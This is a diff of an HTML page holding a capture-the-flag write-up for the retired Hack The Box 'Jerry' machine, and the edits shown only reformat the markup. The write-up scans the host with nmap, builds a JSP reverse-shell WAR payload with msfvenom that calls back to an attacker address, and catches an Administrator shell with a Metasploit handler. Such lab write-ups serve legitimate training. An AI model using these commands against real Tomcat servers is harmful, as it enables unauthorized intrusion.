@@ -96,9 +96,10 @@
     <div class="entry-content">
             <p>I started to work on <a href="www.hackthebox.eu">Hack The Box</a> machine in 2018. This is a writeup for the
 retired <a href="https://www.hackthebox.eu/home/machines/profile/144">Jerry</a> machine.</p>
-<p><img alt="Jerry VM homepage" class="align-left" src="/media/2019.09/jerry_1.png" width="262"/></p>
+<p><img class="align-left" src="/media/2019.09/jerry_1.png" alt="Jerry VM homepage" width="262"></p>
 
-<h1 id="hack the box">Hack the Box</h1>
+
+<h1>Hack the Box</h1>
 <p>In 2018 I started to play with <a href="www.hackthebox.eu">Hack the box</a>. The principle
 is similar to the <a href="https://www.vulnhub.com/about/">vulnhub</a> machines: You got a
 VM and have to root it. The main difference is that you are connected to a VPN 
@@ -109,7 +110,7 @@ Finally, nobody is publishing Writeup before the VM is retired.</p>
 writeup.</p>
 <p>The Jerry machine is Windows server. This VM is classified as a trivial one. In
 fact it is a really easy one.</p>
-<h1 id="network discovery">Network discovery</h1>
+<h1>Network discovery</h1>
 <p>As usual, we start with a simple network scan using nmap in order to scan the
 open TCP ports: Only the port 8080 is open with an HTTP service.</p>
 <div class="highlight"><pre><span></span>root@kalili:~# nmap -p- 10.10.10.95 -sSV
@@ -123,12 +124,16 @@ PORT     STATE SERVICE VERSION
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 112.41 seconds
 </pre></div>
+
+
 <p>When going to this page we see a simple Tomcat Application Manager.</p>
-<p><img alt="Tomcat application manager" src="/media/2019.09/jerry_2.png"/></p>
-<h1 id="exploiting the administration interface">Exploiting the administration interface</h1>
+<p><img alt="Tomcat application manager" src="/media/2019.09/jerry_2.png"></p>
+<h1>Exploiting the administration interface</h1>
 <p>We generate a Java reverse shell payload using <code>msfvenom</code>:</p>
 <div class="highlight"><pre><span></span>root@kalili:~# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.14 LPORT=4444 -f war &gt; reverse2.war
 </pre></div>
+
+
 <p>We start the handler using <code>metasploit</code>:</p>
 <div class="highlight"><pre><span></span>msf exploit(multi/handler) &gt; use exploit/multi/handler 
 msf exploit(multi/handler) &gt; show options
@@ -154,6 +159,8 @@ Exploit target:
   --  ----
   0   Wildcard Target
 </pre></div>
+
+
 <p>When running the War payload we got a shell as Administrator and we can start
 listing the directories looking for the flags:</p>
 <div class="highlight"><pre><span></span>C:\apache-tomcat-7.0.88&gt;dir c:\Users
@@ -188,6 +195,8 @@ dir c:\Users\Administrator\Desktop\flags
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489
 </pre></div>
+
+
 <p>As we already are administrator we can read the flag for the two level:</p>
 <div class="highlight"><pre><span></span>Directory of c:\Users\Administrator\Desktop\flags
 
